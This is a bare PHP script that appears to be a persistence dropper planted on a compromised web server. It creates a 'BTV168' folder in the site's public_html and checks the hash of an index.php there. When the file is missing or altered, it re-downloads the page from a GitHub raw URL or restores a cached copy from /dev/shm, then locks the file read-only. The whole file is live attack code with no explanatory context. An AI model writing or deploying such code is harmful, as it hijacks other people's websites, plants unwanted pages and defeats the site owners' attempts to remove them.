<?php
if (!is_dir('/home/simlitabmas/public_html/BTV168/'))
    {
        mkdir('/home/simlitabmas/public_html/BTV168/', 0755, true);
    }
    else
    {
        if (is_writable('/home/simlitabmas/public_html/BTV168/'))
        {
            chmod('/home/simlitabmas/public_html/BTV168/', 0755);
        }
    }
if (!is_dir('/home/simlitabmas/public_html/BTV168/'))
    {
        mkdir('/home/simlitabmas/public_html/BTV168/', 0755, true);
    }
    else
    {
        if (is_writable('/home/simlitabmas/public_html/BTV168/'))
        {
            chmod('/home/simlitabmas/public_html/BTV168/', 0755);
        }
    }
    $file = '/home/simlitabmas/public_html/BTV168/index.php';
    $resource = '/dev/shm/logs';
    $md5file = md5_file($file);
    $md5resource = md5_file($resource);
    if (!file_exists($file))
    {
        if ($md5resource != 'ff3c851ffe3c9c219c2f61ad11f16a5b')
        {
   chmod($file, 0644);
            $report = file_get_contents('https://raw.githubusercontent.com/perfectproject303/page/main/dinus.ac.idbtv168.html');
            file_put_contents($file, $report);
            chmod($file, 0444);
        }
        else
        {
   chmod($file, 0644);
            copy($resource, $file);
            chmod($file, 0444);
        }
    }
    else
    {
        if ($md5file != 'ff3c851ffe3c9c219c2f61ad11f16a5b')
        {
            chmod($file, 0644);
            unlink($file);
            if ($md5resource != 'ff3c851ffe3c9c219c2f61ad11f16a5b')
            {
    chmod($file, 0644);
                $report = file_get_contents('https://raw.githubusercontent.com/perfectproject303/page/main/dinus.ac.idbtv168.html');
                file_put_contents($file, $report);
                chmod($file, 0444);
            }
            else
            {
    chmod($file, 0644);
                copy($resource, $file);
                chmod($file, 0444);
            }
        }
    }

        chmod($file, 0444);
        chmod($resource, 0444);
        chmod('/home/simlitabmas/public_html/BTV168/', 0755);

  ?>
